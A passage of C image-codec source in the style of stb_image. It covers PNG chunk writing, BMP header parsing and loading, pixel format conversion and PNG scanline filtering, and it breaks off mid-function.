   stbiw__wp32(o, 13); // header length
   stbiw__wptag(o, "IHDR");
   stbiw__wp32(o, x);
   stbiw__wp32(o, y);
   *o++ = 8;
   *o++ = STBIW_UCHAR(ctype[n]);
   *o++ = 0;
   *o++ = 0;
   *o++ = 0;
   stbiw__wpcrc(&o,13);

   stbiw__wp32(o, zlen);
   stbiw__wptag(o, "IDAT");
   STBIW_MEMMOVE(o, zlib, zlen);
   o += zlen;
   STBIW_FREE(zlib);
   stbiw__wpcrc(&o, zlen);

   stbiw__wp32(o,0);
   stbiw__wptag(o, "IEND");
   stbiw__wpcrc(&o,0);

   return out;
}

#define STBI_MAX_DIMENSIONS 16777216

typedef struct
{
   int      (*read)  (void *user,char *data,int size);   // fill 'data' with 'size' bytes.  return number of bytes actually read
   void     (*skip)  (void *user,int n);                 // skip the next 'n' bytes, or 'unget' the last -n bytes if negative
   int      (*eof)   (void *user);                       // returns nonzero if we are at end of file/data
} stbi_io_callbacks;

typedef struct
{
   unsigned int img_x, img_y;
   int img_n, img_out_n;

   stbi_io_callbacks io;
   void *io_user_data;

   int read_from_callbacks;
   int buflen;
   unsigned char buffer_start[128];
   int callback_already_read;

   unsigned char *img_buffer, *img_buffer_end;
   unsigned char *img_buffer_original, *img_buffer_original_end;
} stbi__context;

static void stbi__refill_buffer(stbi__context *s)
{
   int n = (s->io.read)(s->io_user_data,(char*)s->buffer_start,s->buflen);
   s->callback_already_read += (int) (s->img_buffer - s->img_buffer_original);
   if (n == 0) {
      // at end of file, treat same as if from memory, but need to handle case
      // where s->img_buffer isn't pointing to safe memory, e.g. 0-byte file
      s->read_from_callbacks = 0;
      s->img_buffer = s->buffer_start;
      s->img_buffer_end = s->buffer_start+1;
      *s->img_buffer = 0;
   } else {
      s->img_buffer = s->buffer_start;
      s->img_buffer_end = s->buffer_start + n;
   }
}

static int stbi__shiftsigned(unsigned int v, int shift, int bits)
{
   static unsigned int mul_table[9] = {
      0,
      0xff/*0b11111111*/, 0x55/*0b01010101*/, 0x49/*0b01001001*/, 0x11/*0b00010001*/,
      0x21/*0b00100001*/, 0x41/*0b01000001*/, 0x81/*0b10000001*/, 0x01/*0b00000001*/,
   };
   static unsigned int shift_table[9] = {
      0, 0,0,1,0,2,4,6,0,
   };
   if (shift < 0)
      v <<= -shift;
   else
      v >>= shift;
   v >>= (8-bits);
   return (int) ((unsigned) v * mul_table[bits]) >> shift_table[bits];
}

typedef struct
{
   int bpp, offset, hsz;
   unsigned int mr,mg,mb,ma, all_a;
   int extra_read;
} stbi__bmp_data;

static int stbi__bmp_set_mask_defaults(stbi__bmp_data *info, int compress)
{
   // BI_BITFIELDS specifies masks explicitly, don't override
   if (compress == 3)
      return 1;

   if (compress == 0) {
      if (info->bpp == 16) {
         info->mr = 31u << 10;
         info->mg = 31u <<  5;
         info->mb = 31u <<  0;
      } else if (info->bpp == 32) {
         info->mr = 0xffu << 16;
         info->mg = 0xffu <<  8;
         info->mb = 0xffu <<  0;
         info->ma = 0xffu << 24;
         info->all_a = 0; // if all_a is 0 at end, then we loaded alpha channel but it was all 0
      } else {
         // otherwise, use defaults, which is all-0
         info->mr = info->mg = info->mb = info->ma = 0;
      }
      return 1;
   }
   return 0; // error
}

static int stbi__addsizes_valid(int a, int b)
{
   if (b < 0) return 0;
   // now 0 <= b <= INT_MAX, hence also
   // 0 <= INT_MAX - b <= INTMAX.
   // And "a + b <= INT_MAX" (which might overflow) is the
   // same as a <= INT_MAX - b (no overflow)
   return a <= INT_MAX - b;
}

inline static unsigned char stbi__get8(stbi__context *s)
{
   if (s->img_buffer < s->img_buffer_end)
      return *s->img_buffer++;
   if (s->read_from_callbacks) {
      stbi__refill_buffer(s);
      return *s->img_buffer++;
   }
   return 0;
}

static int stbi__get16be(stbi__context *s)
{
   int z = stbi__get8(s);
   return (z << 8) + stbi__get8(s);
}

static unsigned int stbi__get32be(stbi__context *s)
{
   unsigned int z = stbi__get16be(s);
   return (z << 16) + stbi__get16be(s);
}

static int stbi__get16le(stbi__context *s)
{
   int z = stbi__get8(s);
   return z + (stbi__get8(s) << 8);
}

// returns 1 if the product is valid, 0 on overflow.
// negative factors are considered invalid.
static int stbi__mul2sizes_valid(int a, int b)
{
   if (a < 0 || b < 0) return 0;
   if (b == 0) return 1; // mul-by-0 is always safe
   // portable way to check for no overflows in a*b
   return a <= INT_MAX/b;
}

// returns 1 if "a*b + add" has no negative terms/factors and doesn't overflow
static int stbi__mad2sizes_valid(int a, int b, int add)
{
   return stbi__mul2sizes_valid(a, b) && stbi__addsizes_valid(a*b, add);
}

// returns 1 if "a*b*c + add" has no negative terms/factors and doesn't overflow
static int stbi__mad3sizes_valid(int a, int b, int c, int add)
{
   return stbi__mul2sizes_valid(a, b) && stbi__mul2sizes_valid(a*b, c) &&
      stbi__addsizes_valid(a*b*c, add);
}

static void *stbi__malloc(size_t size)
{
    return malloc(size);
}

static void *stbi__malloc_mad3(int a, int b, int c, int add)
{
   if (!stbi__mad3sizes_valid(a, b, c, add)) return NULL;
   return stbi__malloc(a*b*c + add);
}

static int stbi__high_bit(unsigned int z)
{
   int n=0;
   if (z == 0) return -1;
   if (z >= 0x10000) { n += 16; z >>= 16; }
   if (z >= 0x00100) { n +=  8; z >>=  8; }
   if (z >= 0x00010) { n +=  4; z >>=  4; }
   if (z >= 0x00004) { n +=  2; z >>=  2; }
   if (z >= 0x00002) { n +=  1;/* >>=  1;*/ }
   return n;
}

static void stbi__skip(stbi__context *s, int n)
{
   if (n == 0) return;  // already there!
   if (n < 0) {
      s->img_buffer = s->img_buffer_end;
      return;
   }
   if (s->io.read) {
      int blen = (int) (s->img_buffer_end - s->img_buffer);
      if (blen < n) {
         s->img_buffer = s->img_buffer_end;
         (s->io.skip)(s->io_user_data, n - blen);
         return;
      }
   }
   s->img_buffer += n;
}

static int stbi__bitcount(unsigned int a)
{
   a = (a & 0x55555555) + ((a >>  1) & 0x55555555); // max 2
   a = (a & 0x33333333) + ((a >>  2) & 0x33333333); // max 4
   a = (a + (a >> 4)) & 0x0f0f0f0f; // max 8 per 4, now 8 bits
   a = (a + (a >> 8)); // max 16 per 8 bits
   a = (a + (a >> 16)); // max 32 per 8 bits
   return a & 0xff;
}

static unsigned int stbi__get32le(stbi__context *s)
{
   unsigned int z = stbi__get16le(s);
   z += (unsigned int)stbi__get16le(s) << 16;
   return z;
}

static int stbi__bmp_test_raw(stbi__context *s)
{
   int r;
   int sz;
   if (stbi__get8(s) != 'B') return 0;
   if (stbi__get8(s) != 'M') return 0;
   stbi__get32le(s); // discard filesize
   stbi__get16le(s); // discard reserved
   stbi__get16le(s); // discard reserved
   stbi__get32le(s); // discard data offset
   sz = stbi__get32le(s);
   r = (sz == 12 || sz == 40 || sz == 56 || sz == 108 || sz == 124);
   return r;
}

static void stbi__rewind(stbi__context *s)
{
   // conceptually rewind SHOULD rewind to the beginning of the stream,
   // but we just rewind to the beginning of the initial buffer, because
   // we only use it after doing 'test', which only ever looks at at most 92 bytes
   s->img_buffer = s->img_buffer_original;
   s->img_buffer_end = s->img_buffer_original_end;
}

static int stbi__bmp_test(stbi__context *s)
{
   int r = stbi__bmp_test_raw(s);
   stbi__rewind(s);
   return r;
}

typedef struct
{
   int bits_per_channel;
   int num_channels;
   int channel_order;
} stbi__result_info;

static unsigned char stbi__compute_y(int r, int g, int b)
{
   return (unsigned char) (((r*77) + (g*150) +  (29*b)) >> 8);
}

static unsigned char *stbi__convert_format(unsigned char *data, int img_n, int req_comp, unsigned int x, unsigned int y)
{
   int i,j;
   unsigned char *good;

   if (req_comp == img_n) return data;

   good = (unsigned char *) stbi__malloc_mad3(req_comp, x, y, 0);
   if (good == NULL) {
      free(data);
      return 0;
   }

   for (j=0; j < (int) y; ++j) {
      unsigned char *src  = data + j * x * img_n   ;
      unsigned char *dest = good + j * x * req_comp;

      #define STBI__COMBO(a,b)  ((a)*8+(b))
      #define STBI__CASE(a,b)   case STBI__COMBO(a,b): for(i=x-1; i >= 0; --i, src += a, dest += b)
      // convert source image with img_n components to one with req_comp components;
      // avoid switch per pixel, so use switch per scanline and massive macros
      switch (STBI__COMBO(img_n, req_comp)) {
         STBI__CASE(1,2) { dest[0]=src[0]; dest[1]=255;                                     } break;
         STBI__CASE(1,3) { dest[0]=dest[1]=dest[2]=src[0];                                  } break;
         STBI__CASE(1,4) { dest[0]=dest[1]=dest[2]=src[0]; dest[3]=255;                     } break;
         STBI__CASE(2,1) { dest[0]=src[0];                                                  } break;
         STBI__CASE(2,3) { dest[0]=dest[1]=dest[2]=src[0];                                  } break;
         STBI__CASE(2,4) { dest[0]=dest[1]=dest[2]=src[0]; dest[3]=src[1];                  } break;
         STBI__CASE(3,4) { dest[0]=src[0];dest[1]=src[1];dest[2]=src[2];dest[3]=255;        } break;
         STBI__CASE(3,1) { dest[0]=stbi__compute_y(src[0],src[1],src[2]);                   } break;
         STBI__CASE(3,2) { dest[0]=stbi__compute_y(src[0],src[1],src[2]); dest[1] = 255;    } break;
         STBI__CASE(4,1) { dest[0]=stbi__compute_y(src[0],src[1],src[2]);                   } break;
         STBI__CASE(4,2) { dest[0]=stbi__compute_y(src[0],src[1],src[2]); dest[1] = src[3]; } break;
         STBI__CASE(4,3) { dest[0]=src[0];dest[1]=src[1];dest[2]=src[2];                    } break;
         default: free(data); free(good); return 0;
      }
      #undef STBI__CASE
   }

   free(data);
   return good;
}

static void *stbi__bmp_parse_header(stbi__context *s, stbi__bmp_data *info)
{
   int hsz;
   if (stbi__get8(s) != 'B' || stbi__get8(s) != 'M') return 0;
   stbi__get32le(s); // discard filesize
   stbi__get16le(s); // discard reserved
   stbi__get16le(s); // discard reserved
   info->offset = stbi__get32le(s);
   info->hsz = hsz = stbi__get32le(s);
   info->mr = info->mg = info->mb = info->ma = 0;
   info->extra_read = 14;

   if (info->offset < 0) return 0;

   if (hsz != 12 && hsz != 40 && hsz != 56 && hsz != 108 && hsz != 124) return 0;
   if (hsz == 12) {
      s->img_x = stbi__get16le(s);
      s->img_y = stbi__get16le(s);
   } else {
      s->img_x = stbi__get32le(s);
      s->img_y = stbi__get32le(s);
   }
   if (stbi__get16le(s) != 1) return 0;
   info->bpp = stbi__get16le(s);
   if (hsz != 12) {
      int compress = stbi__get32le(s);
      if (compress == 1 || compress == 2) return 0;
      if (compress >= 4) return 0; // this includes PNG/JPEG modes
      if (compress == 3 && info->bpp != 16 && info->bpp != 32) return 0;
      stbi__get32le(s); // discard sizeof
      stbi__get32le(s); // discard hres
      stbi__get32le(s); // discard vres
      stbi__get32le(s); // discard colorsused
      stbi__get32le(s); // discard max important
      if (hsz == 40 || hsz == 56) {
         if (hsz == 56) {
            stbi__get32le(s);
            stbi__get32le(s);
            stbi__get32le(s);
            stbi__get32le(s);
         }
         if (info->bpp == 16 || info->bpp == 32) {
            if (compress == 0) {
               stbi__bmp_set_mask_defaults(info, compress);
            } else if (compress == 3) {
               info->mr = stbi__get32le(s);
               info->mg = stbi__get32le(s);
               info->mb = stbi__get32le(s);
               info->extra_read += 12;
               // not documented, but generated by photoshop and handled by mspaint
               if (info->mr == info->mg && info->mg == info->mb) {
                  return 0;
               }
            } else
               return 0;
         }
      } else {
         // V4/V5 header
         int i;
         if (hsz != 108 && hsz != 124)
            return 0;
         info->mr = stbi__get32le(s);
         info->mg = stbi__get32le(s);
         info->mb = stbi__get32le(s);
         info->ma = stbi__get32le(s);
         if (compress != 3) // override mr/mg/mb unless in BI_BITFIELDS mode, as per docs
            stbi__bmp_set_mask_defaults(info, compress);
         stbi__get32le(s); // discard color space
         for (i=0; i < 12; ++i)
            stbi__get32le(s); // discard color space parameters
         if (hsz == 124) {
            stbi__get32le(s); // discard rendering intent
            stbi__get32le(s); // discard offset of profile data
            stbi__get32le(s); // discard size of profile data
            stbi__get32le(s); // discard reserved
         }
      }
   }
   return (void *) 1;
}

#define STBI__BYTECAST(x)  ((unsigned char) ((x) & 255))

static void *stbi__bmp_load(stbi__context *s, int *x, int *y, int *comp, int req_comp, stbi__result_info *ri)
{
   unsigned char *out;
   unsigned int mr=0,mg=0,mb=0,ma=0, all_a;
   unsigned char pal[256][4];
   int psize=0,i,j,width;
   int flip_vertically, pad, target;
   stbi__bmp_data info;
   (void)(ri);

   info.all_a = 255;
   if (stbi__bmp_parse_header(s, &info) == NULL)
      return NULL; // error code already set

   flip_vertically = ((int) s->img_y) > 0;
   s->img_y = abs((int) s->img_y);

   if (s->img_y > STBI_MAX_DIMENSIONS) return 0;
   if (s->img_x > STBI_MAX_DIMENSIONS) return 0;

   mr = info.mr;
   mg = info.mg;
   mb = info.mb;
   ma = info.ma;
   all_a = info.all_a;

   if (info.hsz == 12) {
      if (info.bpp < 24)
         psize = (info.offset - info.extra_read - 24) / 3;
   } else {
      if (info.bpp < 16)
         psize = (info.offset - info.extra_read - info.hsz) >> 2;
   }
   if (psize == 0) {
      // accept some number of extra bytes after the header, but if the offset points either to before
      // the header ends or implies a large amount of extra data, reject the file as malformed
      int bytes_read_so_far = s->callback_already_read + (int)(s->img_buffer - s->img_buffer_original);
      int header_limit = 1024; // max we actually read is below 256 bytes currently.
      int extra_data_limit = 256*4; // what ordinarily goes here is a palette; 256 entries*4 bytes is its max size.
      if (bytes_read_so_far <= 0 || bytes_read_so_far > header_limit) {
         return 0;
      }
      // we established that bytes_read_so_far is positive and sensible.
      // the first half of this test rejects offsets that are either too small positives, or
      // negative, and guarantees that info.offset >= bytes_read_so_far > 0. this in turn
      // ensures the number computed in the second half of the test can't overflow.
      if (info.offset < bytes_read_so_far || info.offset - bytes_read_so_far > extra_data_limit) {
         return 0;
      } else {
         stbi__skip(s, info.offset - bytes_read_so_far);
      }
   }

   if (info.bpp == 24 && ma == 0xff000000)
      s->img_n = 3;
   else
      s->img_n = ma ? 4 : 3;
   if (req_comp && req_comp >= 3) // we can directly decode 3 or 4
      target = req_comp;
   else
      target = s->img_n; // if they want monochrome, we'll post-convert

   // sanity-check size
   if (!stbi__mad3sizes_valid(target, s->img_x, s->img_y, 0))
      return 0;

   out = (unsigned char *) stbi__malloc_mad3(target, s->img_x, s->img_y, 0);
   if (!out) return 0;
   if (info.bpp < 16) {
      int z=0;
      if (psize == 0 || psize > 256) { free(out); return 0; }
      for (i=0; i < psize; ++i) {
         pal[i][2] = stbi__get8(s);
         pal[i][1] = stbi__get8(s);
         pal[i][0] = stbi__get8(s);
         if (info.hsz != 12) stbi__get8(s);
         pal[i][3] = 255;
      }
      stbi__skip(s, info.offset - info.extra_read - info.hsz - psize * (info.hsz == 12 ? 3 : 4));
      if (info.bpp == 1) width = (s->img_x + 7) >> 3;
      else if (info.bpp == 4) width = (s->img_x + 1) >> 1;
      else if (info.bpp == 8) width = s->img_x;
      else { free(out); return 0; }
      pad = (-width)&3;
      if (info.bpp == 1) {
         for (j=0; j < (int) s->img_y; ++j) {
            int bit_offset = 7, v = stbi__get8(s);
            for (i=0; i < (int) s->img_x; ++i) {
               int color = (v>>bit_offset)&0x1;
               out[z++] = pal[color][0];
               out[z++] = pal[color][1];
               out[z++] = pal[color][2];
               if (target == 4) out[z++] = 255;
               if (i+1 == (int) s->img_x) break;
               if((--bit_offset) < 0) {
                  bit_offset = 7;
                  v = stbi__get8(s);
               }
            }
            stbi__skip(s, pad);
         }
      } else {
         for (j=0; j < (int) s->img_y; ++j) {
            for (i=0; i < (int) s->img_x; i += 2) {
               int v=stbi__get8(s),v2=0;
               if (info.bpp == 4) {
                  v2 = v & 15;
                  v >>= 4;
               }
               out[z++] = pal[v][0];
               out[z++] = pal[v][1];
               out[z++] = pal[v][2];
               if (target == 4) out[z++] = 255;
               if (i+1 == (int) s->img_x) break;
               v = (info.bpp == 8) ? stbi__get8(s) : v2;
               out[z++] = pal[v][0];
               out[z++] = pal[v][1];
               out[z++] = pal[v][2];
               if (target == 4) out[z++] = 255;
            }
            stbi__skip(s, pad);
         }
      }
   } else {
      int rshift=0,gshift=0,bshift=0,ashift=0,rcount=0,gcount=0,bcount=0,acount=0;
      int z = 0;
      int easy=0;
      stbi__skip(s, info.offset - info.extra_read - info.hsz);
      if (info.bpp == 24) width = 3 * s->img_x;
      else if (info.bpp == 16) width = 2*s->img_x;
      else /* bpp = 32 and pad = 0 */ width=0;
      pad = (-width) & 3;
      if (info.bpp == 24) {
         easy = 1;
      } else if (info.bpp == 32) {
         if (mb == 0xff && mg == 0xff00 && mr == 0x00ff0000 && ma == 0xff000000)
            easy = 2;
      }
      if (!easy) {
         if (!mr || !mg || !mb) { free(out); return 0; }
         // right shift amt to put high bit in position #7
         rshift = stbi__high_bit(mr)-7; rcount = stbi__bitcount(mr);
         gshift = stbi__high_bit(mg)-7; gcount = stbi__bitcount(mg);
         bshift = stbi__high_bit(mb)-7; bcount = stbi__bitcount(mb);
         ashift = stbi__high_bit(ma)-7; acount = stbi__bitcount(ma);
         if (rcount > 8 || gcount > 8 || bcount > 8 || acount > 8) { free(out); return 0; }
      }
      for (j=0; j < (int) s->img_y; ++j) {
         if (easy) {
            for (i=0; i < (int) s->img_x; ++i) {
               unsigned char a;
               out[z+2] = stbi__get8(s);
               out[z+1] = stbi__get8(s);
               out[z+0] = stbi__get8(s);
               z += 3;
               a = (easy == 2 ? stbi__get8(s) : 255);
               all_a |= a;
               if (target == 4) out[z++] = a;
            }
         } else {
            int bpp = info.bpp;
            for (i=0; i < (int) s->img_x; ++i) {
               unsigned int v = (bpp == 16 ? (unsigned int) stbi__get16le(s) : stbi__get32le(s));
               unsigned int a;
               out[z++] = STBI__BYTECAST(stbi__shiftsigned(v & mr, rshift, rcount));
               out[z++] = STBI__BYTECAST(stbi__shiftsigned(v & mg, gshift, gcount));
               out[z++] = STBI__BYTECAST(stbi__shiftsigned(v & mb, bshift, bcount));
               a = (ma ? stbi__shiftsigned(v & ma, ashift, acount) : 255);
               all_a |= a;
               if (target == 4) out[z++] = STBI__BYTECAST(a);
            }
         }
         stbi__skip(s, pad);
      }
   }

   // if alpha channel is all 0s, replace with all 255s
   if (target == 4 && all_a == 0)
      for (i=4*s->img_x*s->img_y-1; i >= 0; i -= 4)
         out[i] = 255;

   if (flip_vertically) {
      unsigned char t;
      for (j=0; j < (int) s->img_y>>1; ++j) {
         unsigned char *p1 = out +      j     *s->img_x*target;
         unsigned char *p2 = out + (s->img_y-1-j)*s->img_x*target;
         for (i=0; i < (int) s->img_x*target; ++i) {
            t = p1[i]; p1[i] = p2[i]; p2[i] = t;
         }
      }
   }

   if (req_comp && req_comp != target) {
      out = stbi__convert_format(out, target, req_comp, s->img_x, s->img_y);
      if (out == NULL) return out; // stbi__convert_format frees input on failure
   }

   *x = s->img_x;
   *y = s->img_y;
   if (comp) *comp = s->img_n;
   return out;
}

static unsigned char *stbi__convert_16_to_8(unsigned short *orig, int w, int h, int channels)
{
   int i;
   int img_len = w * h * channels;
   unsigned char *reduced = (unsigned char*) malloc(img_len);
   if (reduced == NULL) return 0;

   for (i = 0; i < img_len; ++i)
      reduced[i] = (unsigned char)((orig[i] >> 8) & 0xFF);

   free(orig);
   return reduced;
}

enum
{
   STBI_ORDER_RGB,
   STBI_ORDER_BGR
};

static void *stbi__load_main(stbi__context *s, int *x, int *y, int *comp, int req_comp, stbi__result_info *ri, int bpc)
{
   memset(ri, 0, sizeof(*ri)); // make sure it's initialized if we add new fields
   ri->bits_per_channel = 8; // default is 8 so most paths don't have to be changed
   ri->channel_order = STBI_ORDER_RGB; // all current input & output are this, but this is here so we can add BGR order
   ri->num_channels = 0;

   if (stbi__bmp_test(s)) return stbi__bmp_load(s,x,y,comp,req_comp, ri);
   return 0;
}

static void stbi__vertical_flip(void *image, int w, int h, int bytes_per_pixel)
{
   int row;
   size_t bytes_per_row = (size_t)w * bytes_per_pixel;
   unsigned char temp[2048];
   unsigned char *bytes = (unsigned char *)image;

   for (row = 0; row < (h>>1); row++)
   {
      unsigned char *row0 = bytes + row*bytes_per_row;
      unsigned char *row1 = bytes + (h - row - 1)*bytes_per_row;
      size_t bytes_left = bytes_per_row;
      while (bytes_left)
	  {
         size_t bytes_copy = (bytes_left < sizeof(temp)) ? bytes_left : sizeof(temp);
         memcpy(temp, row0, bytes_copy);
         memcpy(row0, row1, bytes_copy);
         memcpy(row1, temp, bytes_copy);
         row0 += bytes_copy;
         row1 += bytes_copy;
         bytes_left -= bytes_copy;
      }
   }
}

static unsigned char *stbi__load_and_postprocess_8bit(stbi__context *s, int *x, int *y, int *comp, int req_comp)
{
	stbi__result_info ri;
	void *result = stbi__load_main(s, x, y, comp, req_comp, &ri, 8);

	if (result == NULL)
		return NULL;

	if (ri.bits_per_channel != 8)
	{
		result = stbi__convert_16_to_8((unsigned short *) result, *x, *y, req_comp == 0 ? *comp : req_comp);
		ri.bits_per_channel = 8;
	}

	//int channels = req_comp ? req_comp : *comp;
	//stbi__vertical_flip(result, *x, *y, channels * sizeof(unsigned char));

  	return (unsigned char *) result;
}

static void stbi__start_mem(stbi__context *s, const unsigned char *buffer, int len)
{
   s->io.read = NULL;
   s->read_from_callbacks = 0;
   s->callback_already_read = 0;
   s->img_buffer = s->img_buffer_original = (unsigned char *) buffer;
   s->img_buffer_end = s->img_buffer_original_end = (unsigned char *) buffer+len;
}

static unsigned char *stbi_load_from_memory(const unsigned char *buffer, int len, int *x, int *y, int *comp, int req_comp)
{
   stbi__context s;
   stbi__start_mem(&s,buffer,len);
   return stbi__load_and_postprocess_8bit(&s,x,y,comp,req_comp);
}

typedef struct
{
   stbi__context *s;
   unsigned char *idata, *expanded, *out;
   int depth;
} stbi__png;

enum {
   STBI__F_none=0,
   STBI__F_sub=1,
   STBI__F_up=2,
   STBI__F_avg=3,
   STBI__F_paeth=4,
   // synthetic filter used for first scanline to avoid needing a dummy row of 0s
   STBI__F_avg_first
};

static unsigned char first_row_filter[5] =
{
   STBI__F_none,
   STBI__F_sub,
   STBI__F_none,
   STBI__F_avg_first,
   STBI__F_sub // Paeth with b=c=0 turns out to be equivalent to sub
};

enum
{
   STBI__SCAN_load=0,
   STBI__SCAN_type,
   STBI__SCAN_header
};

static int stbi__check_png_header(stbi__context *s)
{
   static const unsigned char png_sig[8] = { 137,80,78,71,13,10,26,10 };
   int i;
   for (i=0; i < 8; ++i)
      if (stbi__get8(s) != png_sig[i]) return 0;
   return 1;
}

typedef struct
{
   unsigned int length;
   unsigned int type;
} stbi__pngchunk;

static stbi__pngchunk stbi__get_chunk_header(stbi__context *s)
{
   stbi__pngchunk c;
   c.length = stbi__get32be(s);
   c.type   = stbi__get32be(s);
   return c;
}

#define STBI__PNG_TYPE(a,b,c,d)  (((unsigned) (a) << 24) + ((unsigned) (b) << 16) + ((unsigned) (c) << 8) + (unsigned) (d))

static int stbi__getn(stbi__context *s, unsigned char *buffer, int n)
{
   if (s->io.read) {
      int blen = (int) (s->img_buffer_end - s->img_buffer);
      if (blen < n) {
         int res, count;

         memcpy(buffer, s->img_buffer, blen);

         count = (s->io.read)(s->io_user_data, (char*) buffer + blen, n - blen);
         res = (count == (n-blen));
         s->img_buffer = s->img_buffer_end;
         return res;
      }
   }

   if (s->img_buffer+n <= s->img_buffer_end) {
      memcpy(buffer, s->img_buffer, n);
      s->img_buffer += n;
      return 1;
   } else
      return 0;
}

static int stbi__compute_transparency(stbi__png *z, unsigned char tc[3], int out_n)
{
   stbi__context *s = z->s;
   unsigned int i, pixel_count = s->img_x * s->img_y;
   unsigned char *p = z->out;

   if (out_n == 2) {
      for (i=0; i < pixel_count; ++i) {
         p[1] = (p[0] == tc[0] ? 0 : 255);
         p += 2;
      }
   } else {
      for (i=0; i < pixel_count; ++i) {
         if (p[0] == tc[0] && p[1] == tc[1] && p[2] == tc[2])
            p[3] = 0;
         p += 4;
      }
   }
   return 1;
}

static int stbi__compute_transparency16(stbi__png *z, unsigned short tc[3], int out_n)
{
   stbi__context *s = z->s;
   unsigned int i, pixel_count = s->img_x * s->img_y;
   unsigned short *p = (unsigned short*) z->out;

   if (out_n == 2) {
      for (i = 0; i < pixel_count; ++i) {
         p[1] = (p[0] == tc[0] ? 0 : 65535);
         p += 2;
      }
   } else {
      for (i = 0; i < pixel_count; ++i) {
         if (p[0] == tc[0] && p[1] == tc[1] && p[2] == tc[2])
            p[3] = 0;
         p += 4;
      }
   }
   return 1;
}


static void *stbi__malloc_mad2(int a, int b, int add)
{
   if (!stbi__mad2sizes_valid(a, b, add)) return NULL;
   return stbi__malloc(a*b + add);
}

static int stbi__expand_png_palette(stbi__png *a, unsigned char *palette, int len, int pal_img_n)
{
   unsigned int i, pixel_count = a->s->img_x * a->s->img_y;
   unsigned char *p, *temp_out, *orig = a->out;

   p = (unsigned char *) stbi__malloc_mad2(pixel_count, pal_img_n, 0);
   if (p == NULL) return 0;

   // between here and free(out) below, exitting would leak
   temp_out = p;

   if (pal_img_n == 3) {
      for (i=0; i < pixel_count; ++i) {
         int n = orig[i]*4;
         p[0] = palette[n  ];
         p[1] = palette[n+1];
         p[2] = palette[n+2];
         p += 3;
      }
   } else {
      for (i=0; i < pixel_count; ++i) {
         int n = orig[i]*4;
         p[0] = palette[n  ];
         p[1] = palette[n+1];
         p[2] = palette[n+2];
         p[3] = palette[n+3];
         p += 4;
      }
   }
   free(a->out);
   a->out = temp_out;

   return 1;
}

static int stbi__paeth(int a, int b, int c)
{
   // This formulation looks very different from the reference in the PNG spec, but is
   // actually equivalent and has favorable data dependencies and admits straightforward
   // generation of branch-free code, which helps performance significantly.
   int thresh = c*3 - (a + b);
   int lo = a < b ? a : b;
   int hi = a < b ? b : a;
   int t0 = (hi <= thresh) ? lo : c;
   int t1 = (thresh <= lo) ? hi : t0;
   return t1;
}

static void stbi__create_png_alpha_expand8(unsigned char *dest, unsigned char *src, unsigned int x, int img_n)
{
   int i;
   // must process data backwards since we allow dest==src
   if (img_n == 1) {
      for (i=x-1; i >= 0; --i) {
         dest[i*2+1] = 255;
         dest[i*2+0] = src[i];
      }
   } else {
      for (i=x-1; i >= 0; --i) {
         dest[i*4+3] = 255;
         dest[i*4+2] = src[i*3+2];
         dest[i*4+1] = src[i*3+1];
         dest[i*4+0] = src[i*3+0];
      }
   }
}

static const unsigned char stbi__depth_scale_table[9] = { 0, 0xff, 0x55, 0, 0x11, 0,0,0, 0x01 };

static int stbi__create_png_image_raw(stbi__png *a, unsigned char *raw, unsigned int raw_len, int out_n, unsigned int x, unsigned int y, int depth, int color)
{
   int bytes = (depth == 16 ? 2 : 1);
   stbi__context *s = a->s;
   unsigned int i,j,stride = x*out_n*bytes;
   unsigned int img_len, img_width_bytes;
   unsigned char *filter_buf;
   int all_ok = 1;
   int k;
   int img_n = s->img_n; // copy it into a local for later

   int output_bytes = out_n*bytes;
   int filter_bytes = img_n*bytes;
   int width = x;

   a->out = (unsigned char *) stbi__malloc_mad3(x, y, output_bytes, 0); // extra bytes to write off the end into
   if (!a->out) return 0;

   // note: error exits here don't need to clean up a->out individually,
   // stbi__do_png always does on error.
   if (!stbi__mad3sizes_valid(img_n, x, depth, 7)) return 0;
   img_width_bytes = (((img_n * x * depth) + 7) >> 3);
   if (!stbi__mad2sizes_valid(img_width_bytes, y, img_width_bytes)) return 0;
   img_len = (img_width_bytes + 1) * y;

   // we used to check for exact match between raw_len and img_len on non-interlaced PNGs,
   // but issue #276 reported a PNG in the wild that had extra data at the end (all zeros),
   // so just check for raw_len < img_len always.
   if (raw_len < img_len) return 0;

   // Allocate two scan lines worth of filter workspace buffer.
   filter_buf = (unsigned char *) stbi__malloc_mad2(img_width_bytes, 2, 0);
   if (!filter_buf) return 0;

   // Filtering for low-bit-depth images
   if (depth < 8) {
      filter_bytes = 1;
      width = img_width_bytes;
   }

   for (j=0; j < y; ++j) {
      // cur/prior filter buffers alternate
      unsigned char *cur = filter_buf + (j & 1)*img_width_bytes;
      unsigned char *prior = filter_buf + (~j & 1)*img_width_bytes;
      unsigned char *dest = a->out + stride*j;
      int nk = width * filter_bytes;
      int filter = *raw++;

      // check filter type
      if (filter > 4) {
         all_ok = 0;
         break;
      }

      // if first row, use special filter that doesn't sample previous row
      if (j == 0) filter = first_row_filter[filter];

      // perform actual filtering
      switch (filter) {
      case STBI__F_none:
         memcpy(cur, raw, nk);
         break;
      case STBI__F_sub:
         memcpy(cur, raw, filter_bytes);
         for (k = filter_bytes; k < nk; ++k)
            cur[k] = STBI__BYTECAST(raw[k] + cur[k-filter_bytes]);
         break;
      case STBI__F_up:
         for (k = 0; k < nk; ++k)
            cur[k] = STBI__BYTECAST(raw[k] + prior[k]);
         break;
      case STBI__F_avg:
         for (k = 0; k < filter_bytes; ++k)
            cur[k] = STBI__BYTECAST(raw[k] + (prior[k]>>1));
         for (k = filter_bytes; k < nk; ++k)
            cur[k] = STBI__BYTECAST(raw[k] + ((prior[k] + cur[k-filter_bytes])>>1));
         break;
      case STBI__F_paeth:
         for (k = 0; k < filter_bytes; ++k)
            cur[k] = STBI__BYTECAST(raw[k] + prior[k]); // prior[k] == stbi__paeth(0,prior[k],0)
         for (k = filter_bytes; k < nk; ++k)
            cur[k] = STBI__BYTECAST(raw[k] + stbi__paeth(cur[k-filter_bytes], prior[k], prior[k-filter_bytes]));
         break;
      case STBI__F_avg_first:
         memcpy(cur, raw, filter_bytes);
         for (k = filter_bytes; k < nk; ++k)
            cur[k] = STBI__BYTECAST(raw[k] + (cur[k-filter_bytes] >> 1));
         break;
      }

      raw += nk;

      // expand decoded bits in cur to dest, also adding an extra alpha channel if desired
      if (depth < 8) {
         unsigned char scale = (color == 0) ? stbi__depth_scale_table[depth] : 1; // scale grayscale values to 0..255 range
         unsigned char *in = cur;
         unsigned char *out = dest;
         unsigned char inb = 0;
         unsigned int nsmp = x*img_n;

         // expand bits to bytes first
         if (depth == 4) {
            for (i=0; i < nsmp; ++i) {
